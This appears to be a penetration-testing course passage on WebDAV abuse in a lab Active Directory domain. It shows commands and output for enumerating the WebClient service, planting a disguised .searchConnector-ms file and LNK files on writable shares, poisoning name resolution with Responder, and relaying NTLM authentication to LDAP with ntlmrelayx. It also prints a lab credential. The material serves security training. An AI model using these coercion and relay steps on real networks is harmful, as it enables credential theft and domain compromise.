## WebDav
[Web Distributed Authoring and Versioning](https://learn.microsoft.com/en-us/windows/win32/webdav/webdav-portal) (`WebDAV`), defined in [RFC 4918](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of `HTTP` that specifies the methods for carrying out fundamental file operations like copying, moving, deleting, and creating files through HTTP; if we can find hosts with the [WebClient Service](https://revertservice.com/10/webclient/) enabled, we can provide `authentication coercion` tools a `WebDAV` connection string as a listener instead of a `UNC`, forcing it to authenticate our attack machine using `HTTP NTLM` authentication.

The Windows service responsible for `WebDav` is the `WebClient` service; it is enabled by default on Windows workstations, unlike Windows Servers. Remember that even when the service is enabled by default on workstations, it may not run. Let us use `CrackMapExec` to enumerate the network and identify if the service is running:
```shell
0xprofound@htb[/htb]$ nxc smb 172.16.117.0/24 -u $USER -p $PASSWORD -M webdav

SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.50   445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.60   445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe 
SMB         172.16.117.50   445    WS01             [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe 
SMB         172.16.117.60   445    SQL01            [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe
```

None of these servers have `WebDav` running; however, the `WebClient` service might be only stopped, and we can try a method to start this service by forcing a connection to a WebDav service using a [Windows Search Connectors (.searchConnector-ms)](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) file. A `*.searchConnector-ms` file is a special file used to link the computer's search function to particular web services or databases. Like installing a new search engine to a computer, it allows one to quickly find information from that source without launching a web browser or additional software. What makes this type of file useful for our purpose is that it can help us to force the remote computer to enable the `WebClient` service in case it is disabled and allows us, eventually, to force HTTP authentication. To do this, we will take the following content and put it in the shared folder where we got access:

#### searchConnector-ms

  Farming Hashes

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://whatever/</url>
    </simpleLocation>
</searchConnectorDescription>
```

Alternatively, we can use `CrackMapExec`'s module `drop-sc` that will create the file for us and save it into a shared folder:

#### Using CrackMapExec's drop-sc Module
```shell-session
0xprofound@htb[/htb]$ crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing SHARE=smb FILENAME=@secret

[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\anonymous: 
DROP-SC     172.16.117.3    445    DC01             [+] Found writable share: smb
DROP-SC     172.16.117.3    445    DC01             [+] [OPSEC] Created @secret.searchConnector-ms file on the smb share
```

Once a user connects to the shared folder, the `WebClient` service on that computer will start because it's trying to connect to the web server we specified in the URL. Let us again use `CrackMapExec`'s module `webdav` to verify if the `WebDAV` was enabled on any machines:
```shell-session
0xprofound@htb[/htb]$ crackmapexec smb 172.16.117.0/24 -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav

SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe 
SMB         172.16.117.50   445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.60   445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.50   445    WS01             [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe 
WEBDAV      172.16.117.50   445    WS01             WebClient Service enabled on: 172.16.117.50
SMB         172.16.117.60   445    SQL01            [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe
```

Now that we know `WS01` enabled `WebDAV`, we can use `Slinky` to coerce the client to perform an HTTP authentication; however, we need to set `SERVER` using the format `\\ANY_STRING@8008\important` (this is an example of a `WebDAV connection string`, which we will learn about in the next section):
```shell-session
0xprofound@htb[/htb]$ crackmapexec smb 172.16.117.3 -u anonymous -p '' -M slinky -o SERVER=NOAREALNAME@8008 NAME=important

[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\anonymous: 
SLINKY      172.16.117.3    445    DC01             [+] Found writable share: smb
SLINKY      172.16.117.3    445    DC01             [+] Created LNK file on the smb share
```

Next, we use `Responder` to poison the response for the request to the `NOAREALNAME` name:
```shell-session
0xprofound@htb[/htb]$ sudo python3 Responder.py -I ens192
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
```

Finally, we execute `ntlmrelayx` and relay the HTTP authentication to LDAP. We need to include the option `--http-port 8008` because we used the port `8008` in the UNC path. The option `--no-smb-server` is used not to start the `SMB` server, it's not mandatory; we are just using it because we only want to receive `HTTP` authentication on port 8008:
```shell-session
0xprofound@htb[/htb]$ ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-smb-server --http-port 8008 --no-da --no-acl --no-validate-privs --lootdir ldap_dump

Impacket v0.11.0 - Copyright 2023 Fortra

[*] HTTPD(8008): Connection from 172.16.117.50 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(8008): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/CMATOS SUCCEED
[*] Assuming relayed user has privileges to escalate a user via ACL attack
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

**Note:** `thehacker.recipes` blog post [WebClient abuse (WebDAV)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient), has some other methods of making a remote system start the WebClient service.